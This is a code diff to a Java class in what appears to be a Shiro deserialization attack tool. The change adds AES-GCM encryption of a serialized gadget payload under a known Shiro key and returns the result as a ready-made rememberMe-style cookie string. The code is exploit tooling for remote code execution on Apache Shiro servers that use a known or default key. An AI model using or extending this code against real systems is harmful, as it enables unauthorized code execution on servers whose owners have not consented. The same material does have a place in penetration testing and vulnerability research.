@@ -1,5 +1,6 @@
 package com.summersec.attack.deser.frame;
 
+import com.summersec.attack.Encrypt.GcmEncrypt;
 import com.summersec.attack.core.AttackService;
 import com.summersec.attack.deser.payloads.ObjectPayload;
 import com.summersec.attack.deser.util.Gadgets;
@@ -31,9 +32,15 @@ public class Shiro implements FramePayload {
         byte[] encryptpayload = null;
 //        byte[] encryptpayload;
         if (AttackService.aesGcmCipherType == 1) {
-            CipherService cipherService = new AesCipherService();
-            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
-            encryptpayload = byteSource.getBytes();
+//            CipherService cipherService = new AesCipherService();
+//            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
+//            encryptpayload = byteSource.getBytes();
+            GcmEncrypt gcmEncrypt = new GcmEncrypt();
+            String byteSource = gcmEncrypt.encrypt(key,serpayload);
+//            encryptpayload = byteSource.getBytes();
+            System.out.println(shiroKeyWord + "=" + byteSource);
+            return shiroKeyWord + "=" + byteSource;
+
         } else {
             encryptpayload = AesUtil.encrypt(serpayload, bkey);
         }
